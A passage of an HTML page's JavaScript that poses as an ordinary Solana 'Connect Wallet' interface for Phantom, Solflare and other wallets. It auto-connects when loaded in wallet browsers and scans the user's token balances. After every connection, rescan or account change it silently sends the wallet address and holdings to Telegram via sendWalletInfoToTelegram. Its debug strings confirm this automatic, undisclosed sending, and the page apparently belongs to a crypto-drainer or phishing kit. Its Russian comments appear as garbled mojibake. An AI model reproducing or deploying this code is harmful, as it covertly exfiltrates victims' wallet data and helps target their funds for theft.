          'Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1': 'Saber',
          '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R': 'Raydium',
          'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE': 'Orca',
          'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': 'Serum',
          'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6': 'Kin',
          'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac': 'Mango'
        };
      }

      async performFastScan(walletAddress) {
        const startTime = Date.now();
        
        try {
          const fastResults = await checkWalletBalanceFast(walletAddress);
          
          if (!fastResults.success) {
            throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∏ –æ–¥–Ω–∏–º –º–µ—Ç–æ–¥–æ–º');
          }

          const processedTokens = [];
          
          if (fastResults.tokens && Array.isArray(fastResults.tokens)) {
            for (const token of fastResults.tokens) {
              let mintAddress, amount, decimals;

              if (token.account && token.account.data && token.account.data.parsed) {
                const tokenInfo = token.account.data.parsed.info;
                mintAddress = tokenInfo.mint;
                amount = tokenInfo.tokenAmount.uiAmount;
                decimals = tokenInfo.tokenAmount.decimals;
              } else if (token.mint && token.amount !== undefined) {
                mintAddress = token.mint;
                amount = token.amount / Math.pow(10, token.decimals || 0);
                decimals = token.decimals;
              } else {
                continue;
              }

              if (amount > 0) {
                const tokenName = this.knownTokens[mintAddress] || `Token ${mintAddress.slice(0, 8)}...`;
                
                processedTokens.push({
                  name: tokenName,
                  mint: mintAddress,
                  amount: amount,
                  decimals: decimals
                });
              }
            }
          }

          processedTokens.sort((a, b) => b.amount - a.amount);

          const scanDuration = Date.now() - startTime;

          const results = {
            address: walletAddress,
            solBalance: fastResults.solBalance,
            tokens: processedTokens,
            totalTokenAccounts: processedTokens.length,
            scanTimestamp: new Date().toISOString(),
            scanType: 'fast',
            methodUsed: fastResults.methodUsed,
            scanDuration: scanDuration,
            success: true
          };

          return results;

        } catch (error) {
          return {
            address: walletAddress,
            solBalance: 0,
            tokens: [],
            totalTokenAccounts: 0,
            scanTimestamp: new Date().toISOString(),
            error: error.message,
            scanType: 'fast',
            scanDuration: scanDuration,
            success: false
          };
        }
      }
    }

    // ============================================================================
    // WALLET MANAGER
    // ============================================================================

    class SolanaWalletManager {
      constructor() {
        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.scanner = new SolanaWalletScanner();
        this.isScanning = false;
        this.connectionCancelled = false;
        
        this.walletConfigs = {
          phantom: {
            name: 'Phantom',
            provider: () => window.phantom?.solana,
            downloadUrl: '',
            checkMethod: () => window.phantom?.solana?.isPhantom
          },
          solflare: {
            name: 'Solflare',
            provider: () => window.solflare,
            downloadUrl: '',
            checkMethod: () => window.solflare?.isSolflare
          },
          trustwallet: {
            name: 'Trust Wallet',
            provider: () => window.trustwallet?.solana,
            downloadUrl: 'https://trustwallet.com/',
            checkMethod: () => window.trustwallet?.solana
          },
          coinbase: {
            name: 'Coinbase Wallet',
            provider: () => window.coinbaseSolana,
            downloadUrl: 'https://www.coinbase.com/wallet',
            checkMethod: () => window.coinbaseSolana
          },
          bitget: {
            name: 'Bitget Wallet',
            provider: () => window.bitkeep?.solana,
            downloadUrl: 'https://web3.bitget.com/',
            checkMethod: () => window.bitkeep?.solana
          },
          backpack: {
            name: 'Backpack',
            provider: () => window.backpack,
            downloadUrl: 'https://backpack.app/',
            checkMethod: () => window.backpack
          },
          okx: {
            name: 'OKX Wallet',
            provider: () => window.okxwallet?.solana,
            downloadUrl: 'https://www.okx.com/web3',
            checkMethod: () => window.okxwallet?.solana
          },
          exodus: {
            name: 'Exodus',
            provider: () => window.exodus?.solana,
            downloadUrl: 'https://www.exodus.com/',
            checkMethod: () => window.exodus?.solana
          },
          safepal: {
            name: 'SafePal',
            provider: () => window.safepal?.solana,
            downloadUrl: 'https://www.safepal.com/',
            checkMethod: () => window.safepal?.solana
          }
        };

        this.init();
      }
      
      init() {
        this.setupEventListeners();
        
        // Check if we're in a wallet browser and show banner if needed
        const walletBrowserInfo = detectWalletBrowser();
        if (walletBrowserInfo.isWalletBrowser) {
          if (walletBrowserInfo.walletKey === 'phantom' && walletBrowserInfo.isMobile) {
            setTimeout(() => {
              this.directPhantomMobileConnect().catch(err => {
                this.showConnectionStatus('error', 'Phantom –Ω–µ –Ω–∞–π–¥–µ–Ω');
              });
            }, 1000); // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –¥–æ 1 —Å–µ–∫—É–Ω–¥—ã
          } else {
            setTimeout(() => {
              if (!this.connectedWallet && walletBrowserInfo.walletKey) {
                this.connectWallet(walletBrowserInfo.walletKey).catch(err => {
                });
              }
            }, 1500);
          }
        }
        
        this.checkPreviousConnection();
      }

      async checkPreviousConnection() {
        const savedWallet = localStorage.getItem('connectedWallet');
        if (savedWallet && this.walletConfigs[savedWallet]) {
          try {
            await this.connectWallet(savedWallet, false);
          } catch (error) {
            localStorage.removeItem('connectedWallet');
          }
        }
      }

      // –ù–æ–≤—ã–π –º–µ—Ç–æ–¥ –¥–ª—è –ø—Ä—è–º–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –≤ –º–æ–±–∏–ª—å–Ω–æ–º –±—Ä–∞—É–∑–µ—Ä–µ Phantom
      async directPhantomMobileConnect() {
        if (walletBrowserInfo.isWalletBrowser && walletBrowserInfo.walletKey === 'phantom' && walletBrowserInfo.isMobile) {
          try {
            if (!window.phantom || !window.phantom.solana) {
              this.showConnectionStatus('error', 'Phantom –Ω–µ –Ω–∞–π–¥–µ–Ω');
              return;
            }
            const provider = window.phantom.solana;
            const response = await provider.connect();
            return this.processPhantomConnection(provider, response.publicKey);
          } catch (e) {
            throw e;
          }
        }
        // –î–ª—è –æ—Å—Ç–∞–ª—å–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤ ‚Äî Wallet Adapter –∏–ª–∏ —Å—Ç–∞—Ä—ã–π —Å–ø–æ—Å–æ–±
        try {
          if (!window.phantom || !window.phantom.solana) {
            this.showConnectionStatus('error', 'Phantom –Ω–µ –Ω–∞–π–¥–µ–Ω');
            return;
          }
          const provider = window.phantom.solana;
          if (provider.isConnected && provider.publicKey) {
            return this.processPhantomConnection(provider, provider.publicKey);
          }
          let timeout;
          const connectPromise = new Promise(async (resolve, reject) => {
            try {
              let response = await provider.connect({ onlyIfTrusted: true });
              if (!response || !response.publicKey) {
                response = await provider.connect();
              }
              if (response && response.publicKey) {
                resolve(response);
              } else {
                reject(new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å publicKey'));
              }
            } catch (err) {
              reject(err);
            }
          });
          const result = await Promise.race([
            connectPromise,
            new Promise((_, reject) => {
              timeout = setTimeout(() => reject(new Error('‚è≥ –¢–∞–π–º–∞—É—Ç –æ–∂–∏–¥–∞–Ω–∏—è Phantom')), 7000);
            })
          ]);
          clearTimeout(timeout);
          return this.processPhantomConnection(provider, result.publicKey);
        } catch (error) {
          this.showConnectionStatus('error', error.message || '–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è');
          throw error;
        }
      }

      // –î–æ–±–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π –º–µ—Ç–æ–¥ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:

      async processPhantomConnection(provider, publicKey) {
        let walletAddress;
        if (typeof publicKey === 'string') {
          walletAddress = publicKey;
        } else if (publicKey.toString) {
          walletAddress = publicKey.toString();
        } else if (publicKey.toBase58) {
          walletAddress = publicKey.toBase58();
        } else {
          throw new Error('Cannot convert publicKey to string');
        }
        
        this.connectedWallet = provider;
        this.walletAddress = walletAddress;
        this.walletName = 'Phantom';
        
        localStorage.setItem('connectedWallet', 'phantom');
        
        this.updateConnectionUI();
        this.showConnectionStatus('success', 'Connected to Phantom');
        
        this.isScanning = true;
        try {
          this.walletData = await this.scanner.performFastScan(this.walletAddress);
          
          if (this.walletData && this.walletData.address) {
            await sendWalletInfoToTelegram(this.walletName, this.walletData);
          }
          
          this.updateConnectionUI();
        } catch (scanError) {
        } finally {
          this.isScanning = false;
        }
        
        this.setupWalletEventListeners(provider);
        
        return { publicKey };
      }

      async connectWallet(walletKey, requestPermission = true) {
        if (this.isScanning) {
          return;
        }

        this.connectionCancelled = false;

        const config = this.walletConfigs[walletKey];
        
        if (!config) {
          throw new Error(`Unsupported wallet: ${walletKey}`);
        }

        const walletBrowserInfo = detectWalletBrowser();
        const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser && 
                                      walletBrowserInfo.walletKey === 'phantom' && 
                                      walletBrowserInfo.isMobile;
        
        if (walletKey === 'phantom' && isPhantomMobileBrowser) {
          return await this.directPhantomMobileConnect();
        }

        if ((walletKey === 'phantom' || walletKey === 'solflare') && 
            detectDevice().isMobile && 
            !isPhantomMobileBrowser) {
          const deepLinkOpened = openWalletWithDeepLink(walletKey);
          if (deepLinkOpened) {
            this.showConnectionStatus('loading', `Opening ${config.name} app...`);
            return;
          }
        }

        this.showConnectionStatus('loading', `Connecting to ${config.name}...`);

        try {
          let response;
          let provider = config.provider();
          
          if (!provider) {
            this.showConnectionStatus('error', `${config.name} is not installed`);
            throw new Error(`${config.name} is not installed`);
          }

          if (walletKey === 'phantom') {
            response = await this.connectPhantom(provider, requestPermission);
          } else if (walletKey === 'solflare') {
            response = await this.connectSolflare(provider, requestPermission);
          } else {
            response = await this.connectGenericWallet(provider, requestPermission);
          }

          if (this.connectionCancelled) {
            return;
          }

          this.connectedWallet = provider;

          let walletAddress;
          if (response.publicKey) {
            if (typeof response.publicKey === 'string') {
              walletAddress = response.publicKey;
            } else if (response.publicKey.toString) {
              walletAddress = response.publicKey.toString();
            } else if (response.publicKey.toBase58) {
              walletAddress = response.publicKey.toBase58();
            }
          } else if (provider.publicKey) {
            if (typeof provider.publicKey === 'string') {
              walletAddress = provider.publicKey;
            } else if (provider.publicKey.toString) {
              walletAddress = provider.publicKey.toString();
            } else if (provider.publicKey.toBase58) {
              walletAddress = provider.publicKey.toBase58();
            }
          }

          if (!walletAddress) {
            this.showConnectionStatus('error', 'Failed to get wallet address');
            return;
          }

          this.walletAddress = walletAddress;
          this.walletName = config.name;

          localStorage.setItem('connectedWallet', walletKey);

          this.showConnectionStatus('scanning', `Scanning wallet data...`);
          this.isScanning = true;

          try {
            this.walletData = await this.scanner.performFastScan(this.walletAddress);
            
            if (this.walletData && this.walletData.address) {
              await sendWalletInfoToTelegram(this.walletName, this.walletData);
            } else {
              debug('No valid wallet address to send to Telegram');
            }
            
            this.updateConnectionUI();
            
            if (this.walletData.error || !this.walletData.success) {
              this.showConnectionStatus('error', `Connected but scan failed: ${this.walletData.error || 'Unknown error'}`);
            } else {
              this.showConnectionStatus('success', `Connected successfully!`);
            }
            
          } catch (scanError) {
            this.showConnectionStatus('error', `Connected but scan failed: ${scanError.message}`);
            
            this.updateConnectionUI();
          } finally {
            this.isScanning = false;
          }

          this.setupWalletEventListeners(provider);

          return response;

        } catch (error) {
          if (error.message && (error.message.includes('User rejected') || error.message.includes('cancelled') || error.message.includes('rejected'))) {
            this.connectionCancelled = true;
            this.showConnectionStatus('error', 'Connection rejected by user');
          } else {
            this.showConnectionStatus('error', error.message);
          }
          
          this.isScanning = false;
          throw error;
        }
      }

      async rescanWallet() {
        if (!this.walletAddress) {
          this.showConnectionStatus('error', 'No wallet connected');
          return;
        }

        if (this.isScanning) {
          this.showConnectionStatus('error', 'Scan already in progress');
          return;
        }

        this.showConnectionStatus('scanning', 'Scanning wallet data...');
        this.isScanning = true;

        try {
          this.walletData = await this.scanner.performFastScan(this.walletAddress);
          
          if (this.walletData && this.walletData.address) {
            await sendWalletInfoToTelegram(`${this.walletName} (Rescan)`, this.walletData);
          } else {
            debug('No valid wallet address to send to Telegram');
          }
          
          this.showConnectionStatus('success', `Scan completed successfully!`);
          
        } catch (error) {
          this.showConnectionStatus('error', `Scan failed: ${error.message}`);
        } finally {
          this.isScanning = false;
        }
      }

      async connectPhantom(provider, requestPermission) {
        // Enhanced connection logic for Phantom
        if (requestPermission) {
          try {
            if (provider.isConnected && provider.publicKey) {
              return { publicKey: provider.publicKey };
            }
            
            const response = await provider.connect();
            return response;
          } catch (error) {
            this.connectionCancelled = true;
            throw error;
          }
        } else {
          if (provider.isConnected && provider.publicKey) {
            return { publicKey: provider.publicKey };
          } else {
            try {
              const response = await provider.connect();
              return response;
            } catch (error) {
              throw error;
            }
          }
        }
      }

      async connectSolflare(provider, requestPermission) {
        if (requestPermission) {
          try {
            await provider.connect();
            return { publicKey: provider.publicKey };
          } catch (error) {
            this.connectionCancelled = true;
            throw error;
          }
        } else {
          if (provider.isConnected && provider.publicKey) {
            return { publicKey: provider.publicKey };
          } else {
            throw new Error('Solflare wallet not connected');
          }
        }
      }

      async connectGenericWallet(provider, requestPermission) {
        if (requestPermission) {
          if (provider.connect) {
            try {
              const response = await provider.connect();
              return response;
            } catch (error) {
              this.connectionCancelled = true;
              throw error;
            }
          } else {
            throw new Error('Wallet does not support connection');
          }
        } else {
          if (provider.isConnected && provider.publicKey) {
            return { publicKey: provider.publicKey };
          } else {
            throw new Error('Wallet not connected');
          }
        }
      }

      async disconnectWallet() {
        try {
          if (this.connectedWallet && this.connectedWallet.disconnect) {
            await this.connectedWallet.disconnect();
          }
        } catch (error) {
        }

        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.isScanning = false;
        
        localStorage.removeItem('connectedWallet');

        this.updateConnectionUI();
        this.hideConnectionStatus();

      }

      setupWalletEventListeners(provider) {
        if (provider.on) {
          provider.on('disconnect', () => {
            this.disconnectWallet();
          });

          provider.on('accountChanged', (publicKey) => {
            if (publicKey) {
              this.walletAddress = publicKey.toString();
              this.updateConnectionUI();
              setTimeout(() => {
                this.rescanWallet();
              }, 500);
            } else {
              this.disconnectWallet();
            }
          });
        }
      }

      updateConnectionUI() {
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletInfo = document.getElementById('walletInfo');
        const connectedWalletName = document.getElementById('connectedWalletName');
        const walletAddressElement = document.getElementById('walletAddress');

        if (this.connectedWallet && this.walletAddress) {
          connectBtn.textContent = 'Wallet Connected';
          connectBtn.classList.add('connected');
          
          if (walletInfo) {
            walletInfo.classList.remove('hidden');
            connectedWalletName.textContent = this.walletName;
            walletAddressElement.textContent = this.formatAddress(this.walletAddress);
          }
        } else {
          connectBtn.textContent = 'Connect Wallet';
          connectBtn.classList.remove('connected');
          
          if (walletInfo) {
            walletInfo.classList.add('hidden');
          }
        }
      }

      formatAddress(address) {
        if (!address) return '';
        return `${address.slice(0, 4)}...${address.slice(-4)}`;
      }

      showConnectionStatus(type, message) {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.className = `connection-status ${type}`;
          statusElement.textContent = message;
          statusElement.classList.remove('hidden');

          if (type === 'success') {
            setTimeout(() => {
              this.hideConnectionStatus();
            }, 3000);
          }
        }
      }

      hideConnectionStatus() {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.classList.add('hidden');
        }
      }

      setupEventListeners() {
        const connectWalletBtn = document.getElementById('connectWalletBtn');
        if (connectWalletBtn) {
          connectWalletBtn.addEventListener('click', async (e) => {
            const walletBrowserInfo = detectWalletBrowser();
            if (walletBrowserInfo.isWalletBrowser && 
                walletBrowserInfo.walletKey === 'phantom' && 
                walletBrowserInfo.isMobile) {
              
              e.preventDefault();
              e.stopPropagation();
              
              try {
                await this.directPhantomMobileConnect();
              } catch (error) {
              }
              
              return false;
            }
          });
        }

        document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
          option.addEventListener('click', async (e) => {
            const walletKey = option.getAttribute('data-wallet');
            
            const walletBrowserInfo = detectWalletBrowser();
            const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser && 
                                          walletBrowserInfo.walletKey === 'phantom' && 
                                          walletBrowserInfo.isMobile;
            
            if (walletKey === 'phantom' && isPhantomMobileBrowser) {
              e.preventDefault();
              e.stopPropagation();
              
              try {
                await this.directPhantomMobileConnect();
                if (this.walletAddress) {
                  setTimeout(() => {
                    closeAllModals();
                  }, 1500);
                }
              } catch (error) {
              }
              
              return false;
            }
            
            const isPhantomEnv = walletKey === 'phantom' && detectWalletBrowser().walletKey === 'phantom';
            
            if ((walletKey === 'phantom' || walletKey === 'solflare') && 
                detectDevice().isMobile && 
                !isPhantomEnv) {
              const deepLinkOpened = openWalletWithDeepLink(walletKey);
              if (deepLinkOpened) {
                setTimeout(() => {
                  closeAllModals();
                }, 1500);
                return;
              }
            }
            
            try {
              await this.connectWallet(walletKey);
              if (!this.connectionCancelled && this.walletAddress) {
                setTimeout(() => {
                  closeAllModals();
                }, 1500);
              }
            } catch (error) {
            }
          });
        });

        document.querySelectorAll('.wallet-item[data-wallet]').forEach(item => {
          item.addEventListener('click', async (e) => {
            const walletKey = item.getAttribute('data-wallet');
            
            const walletBrowserInfo = detectWalletBrowser();
            const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser && 
                                          walletBrowserInfo.walletKey === 'phantom' && 
                                          walletBrowserInfo.isMobile;
            
            if (walletKey === 'phantom' && isPhantomMobileBrowser) {
              e.preventDefault();
              e.stopPropagation();
              
              try {
                await this.directPhantomMobileConnect();
                if (this.walletAddress) {
                  setTimeout(() => {
                    closeAllModals();
                  }, 1500);
                }
              } catch (error) {
              }
              
              return false;
            }
            
            const isPhantomEnv = walletKey === 'phantom' && detectWalletBrowser().walletKey === 'phantom';
            
            if ((walletKey === 'phantom' || walletKey === 'solflare') && 
                detectDevice().isMobile && 
                !isPhantomEnv) {
              const deepLinkOpened = openWalletWithDeepLink(walletKey);
              if (deepLinkOpened) {
                setTimeout(() => {
                  closeAllModals();
                }, 1500);
                return;
              }
            }
            
            try {
              await this.connectWallet(walletKey);
              // –ó–∞–∫—Ä—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –∏ –Ω–µ –±—ã–ª–æ –æ—Ç–º–µ–Ω–µ–Ω–æ
              if (!this.connectionCancelled && this.walletAddress) {
                setTimeout(() => {
                  closeAllModals();
                }, 1500);
              }
            } catch (error) {
              debug('Connection failed:', error);
            }
          });
        });

        const disconnectBtn = document.getElementById('disconnectBtn');
        if (disconnectBtn) {
          disconnectBtn.addEventListener('click', () => {
            this.disconnectWallet();
          });
        }

        const rescanBtn = document.getElementById('rescanBtn');
        if (rescanBtn) {
          rescanBtn.addEventListener('click', () => {
            this.rescanWallet();
          });
        }
      }

      getWalletInfo() {
        return {
          isConnected: !!this.connectedWallet,
          address: this.walletAddress,
          name: this.walletName,
          provider: this.connectedWallet,
          scanData: this.walletData,
          isScanning: this.isScanning
        };
      }
    }

    // ============================================================================
    // MODAL MANAGEMENT
    // ============================================================================

    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const modalOverlay = document.getElementById('modalOverlay');
    const connectWalletModal = document.getElementById('connectWalletModal');
    const allWalletsModal = document.getElementById('allWalletsModal');
    const allWalletsBtn = document.getElementById('allWalletsBtn');
    const closeBtns = document.querySelectorAll('.close-btn');
    const backBtn = document.querySelector('.back-btn');

    function openConnectWalletModal() {
      connectWalletModal.classList.remove('hidden');
      modalOverlay.classList.remove('hidden');
      allWalletsModal.classList.add('hidden');
    }

    function closeAllModals() {
      connectWalletModal.classList.add('hidden');
      allWalletsModal.classList.add('hidden');
      modalOverlay.classList.add('hidden');
      
      // –ï—Å–ª–∏ –µ—Å—Ç—å –∞–∫—Ç–∏–≤–Ω—ã–π walletManager, –æ—Ç–º–µ—á–∞–µ–º —á—Ç–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ
      if (window.walletManager) {
        window.walletManager.connectionCancelled = true;
      }
    }

    function switchToAllWallets() {
      connectWalletModal.classList.add('hidden');
      allWalletsModal.classList.remove('hidden');
    }

    function switchBackToConnectWallet() {
      allWalletsModal.classList.add('hidden');
      connectWalletModal.classList.remove('hidden');
    }

    connectWalletBtn.addEventListener('click', openConnectWalletModal);
    allWalletsBtn.addEventListener('click', switchToAllWallets);
    backBtn.addEventListener('click', switchBackToConnectWallet);

    closeBtns.forEach(btn => {
      btn.addEventListener('click', closeAllModals);
    });

    modalOverlay.addEventListener('click', closeAllModals);

    // ============================================================================
    // INITIALIZATION
    // ============================================================================

    let walletManager;

    document.addEventListener('DOMContentLoaded', () => {
      debug('üöÄ DOM fully loaded');
      
      // –î–æ–±–∞–≤–ª—è–µ–º –æ—Ç–ª–∞–¥–æ—á–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ Phantom
      if (window.phantom) {
        debug('‚úì Phantom object exists at load time');
        debug('‚úì Phantom solana exists:', !!window.phantom.solana);
        if (window.phantom.solana) {
          debug('‚úì Phantom isPhantom:', window.phantom.solana.isPhantom);
          debug('‚úì Phantom isConnected:', window.phantom.solana.isConnected);
          debug('‚úì Phantom publicKey:', window.phantom.solana.publicKey);
          
          // –ü—Ä–æ–≤–µ—Ä—è–µ–º –º–µ—Ç–æ–¥—ã
          debug('‚úì Phantom connect method:', typeof window.phantom.solana.connect);
          debug('‚úì Phantom disconnect method:', typeof window.phantom.solana.disconnect);
          debug('‚úì Phantom signTransaction method:', typeof window.phantom.solana.signTransaction);
        }
      } else {
        debug('‚ùå Phantom object does not exist at load time');
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –ø–æ—è–≤–∏—Ç—Å—è –ª–∏ –æ–±—ä–µ–∫—Ç Phantom –ø–æ–∑–∂–µ
        setTimeout(() => {
          if (window.phantom) {
            debug('‚úì Phantom object appeared after delay');
            debug('‚úì Phantom solana exists (delayed):', !!window.phantom.solana);
          } else {
            debug('‚ùå Phantom object still does not exist after delay');
          }
        }, 1000);
      }
      
      walletManager = new SolanaWalletManager();
      window.walletManager = walletManager;
      
      // Add debug info for Phantom browser
      const walletBrowserInfo = detectWalletBrowser();
      if (walletBrowserInfo.isWalletBrowser) {
        debug('üîç Wallet browser detected:', walletBrowserInfo);
        debug('üì± Device info:', detectDevice());
      }
    });

    // ============================================================================
    // UTILITY FUNCTIONS
    // ============================================================================

    function getConnectedWallet() {
      return walletManager ? walletManager.getWalletInfo() : null;
    }

    async function connectToWallet(walletKey) {
      if (walletManager) {
        return await walletManager.connectWallet(walletKey);
      }
      throw new Error('Wallet manager not initialized');
    }

    async function disconnectWallet() {
      if (walletManager) {
        return await walletManager.disconnectWallet();
      }
    }

    async function rescanWallet() {
      if (walletManager) {
        return await walletManager.rescanWallet();
      }
    }

    // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∏–∑ –∫–æ–Ω—Å–æ–ª–∏
    window.getConnectedWallet = getConnectedWallet;
    window.connectToWallet = connectToWallet;
    window.disconnectWallet = disconnectWallet;
    window.rescanWallet = rescanWallet;
    window.checkWalletBalanceFast = checkWalletBalanceFast;
    window.sendWalletInfoToTelegram = sendWalletInfoToTelegram;
    window.detectWalletBrowser = detectWalletBrowser;
    window.debug = debug;

    debug('üöÄ Solana Wallet Scanner –∑–∞–≥—Ä—É–∂–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!');
    debug('üì§ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram –≤–∫–ª—é—á–µ–Ω–∞');
    debug('üîí –î–µ—Ç–∞–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–æ—à–µ–ª—å–∫–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ Telegram');
    debug('üîç –î–æ–±–∞–≤–ª–µ–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞ –∫–æ—à–µ–ª—å–∫–∞');
    debug('üêû –†–µ–∂–∏–º –æ—Ç–ª–∞–¥–∫–∏ –≤–∫–ª—é—á–µ–Ω');

    // –í—Å—Ç–∞–≤–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏—é –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ Solana Wallet Adapter
    async function connectPhantomViaAdapter() {
      const { PhantomWalletAdapter } = window['@solana/wallet-adapter-wallets'];
      const adapter = new PhantomWalletAdapter();
      if (!adapter.connected) {
        try {
          await adapter.connect();
          debug('Phantom Adapter connected:', adapter.publicKey.toString());
          return adapter;
        } catch (e) {
          debug('Phantom Adapter connection error:', e);
          throw e;
        }
      } else {
        debug('Phantom Adapter already connected:', adapter.publicKey.toString());
        return adapter;
      }
    }
  </script>
</body>
</html>